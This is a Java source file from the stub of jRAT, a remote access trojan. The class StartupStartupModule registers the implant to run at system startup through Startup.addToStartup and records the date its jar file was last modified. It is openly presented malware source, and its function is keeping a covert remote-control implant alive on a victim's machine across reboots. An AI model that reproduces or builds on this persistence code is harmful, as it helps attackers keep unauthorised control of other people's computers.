package se.jrat.stub.modules.startup;

import java.io.File;
import java.util.Date;
import java.util.Map;

import se.jrat.stub.Configuration;
import se.jrat.stub.Startup;
import se.jrat.stub.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		String currentJar = Utils.getJarFile().getAbsolutePath();

		try {
			Startup.addToStartup(Configuration.name);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
			currentJar = currentJar.substring(1, currentJar.length());
		}

		File f = new File(currentJar);
		if (f.exists()) {
			Date da = new Date(f.lastModified());
			Configuration.date = da.toString();
		}

	}

}
